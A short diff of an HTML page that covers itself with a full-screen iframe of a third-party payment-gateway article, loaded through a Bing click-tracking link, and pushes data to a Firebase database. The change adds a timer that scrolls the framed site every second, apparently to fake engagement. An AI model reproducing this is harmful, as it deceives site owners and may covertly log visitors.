@@ -6,7 +6,7 @@
 	<script id="script1" src="https://www.gstatic.com/firebasejs/8.2.3/firebase-app.js"></script>
 	<script id="script2" src="https://www.gstatic.com/firebasejs/8.2.3/firebase-database.js"></script>
 
-	<iframe frameborder="0" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none;" src="https://www.bing.com/ck/a?!&&p=d1b62ca6fdc9ec86JmltdHM9MTcxMjE4ODgwMCZpZ3VpZD0yY2FkZjlmYi0zYjI4LTY0NzUtMzVjNy1lYWVkM2E5YTY1MWMmaW5zaWQ9NTIwOQ&ptn=3&ver=2&hsh=3&fclid=2cadf9fb-3b28-6475-35c7-eaed3a9a651c&psq=payment+gateway+(2024)+moneybrand&u=a1aHR0cHM6Ly93d3cubW9uZXlicmFuZC5vbmxpbmUvMjAyNC8wMS9QYXltZW50LUdhdGV3YXlzLmh0bWw&ntb=1" sandbox="allow-scripts allow-same-origin"></iframe>	
+	<iframe id="Site" frameborder="0" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none;" src="https://www.bing.com/ck/a?!&&p=d1b62ca6fdc9ec86JmltdHM9MTcxMjE4ODgwMCZpZ3VpZD0yY2FkZjlmYi0zYjI4LTY0NzUtMzVjNy1lYWVkM2E5YTY1MWMmaW5zaWQ9NTIwOQ&ptn=3&ver=2&hsh=3&fclid=2cadf9fb-3b28-6475-35c7-eaed3a9a651c&psq=payment+gateway+(2024)+moneybrand&u=a1aHR0cHM6Ly93d3cubW9uZXlicmFuZC5vbmxpbmUvMjAyNC8wMS9QYXltZW50LUdhdGV3YXlzLmh0bWw&ntb=1" sandbox="allow-scripts allow-same-origin"></iframe>	
 
 	<script>
 	const firebaseConfig = {
@@ -44,7 +44,14 @@
     				}
 		fire.push(postData)	
 	});
-			
+
+
+	function scrollIFrame() {
+        var iframe = document.getElementById('Site');
+        iframe.contentWindow.scrollTo(0, iframe.contentWindow.scrollY + 50);
+    		}
+
+    	setInterval(scrollIFrame, 1000);
 	</script>
 
 </body>
